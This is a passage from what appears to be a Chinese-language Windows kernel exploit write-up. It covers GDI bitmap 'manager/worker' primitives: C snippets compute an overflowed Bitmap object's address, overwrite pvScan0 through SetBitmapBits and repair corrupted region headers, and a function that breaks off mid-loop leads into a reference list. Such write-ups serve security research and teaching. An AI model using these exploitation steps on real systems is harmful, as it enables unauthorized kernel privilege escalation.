    int u = addr1[0x1];
    u = u - 0x10;
    addr1[1] = u;
接下来要计算溢出的Bitmap对象的地址，记住region对象的大小为0xbc0，因此将在最后一步得到的地址的最低字节设置为0xc0，并将0xb加给倒数第二个最低字节，将获得发生溢出的位图对象的头部地址。
    ddr1[0] = 0xc0;
    int y = addr1[1];
    y = y + 0xb;
    addr1[1] = y;
然后，管理器（manager）位图对象通过SetBitmapBits覆写工作者位图对象的pvScan0成员为区域头的地址（region
header）。然后，工作者（worker）位图被SetBitmapBits用来设置该地址指向的数据为在第一步骤中读取的头部数据。对于溢出的位图对象头也是这样。
    void SetAddress(BYTE* address) {
        for (int i = 0; i 
**References**
[1] 
[2] 
[3] 
[4] 
[5] Using Paths Example: 
[6] Device Context Types: 
[7] Memory Device Context: 
[8] 
[9] 
[10] Windows Kernel Exploitation : This Time Font hunt you down in 4 bytes –
Keen Team: 
[11] Windows Graphics Programming: Win32 GDI and DirectDraw:
[12] Abusing GDI objects for ring0 exploit primitives reloaded: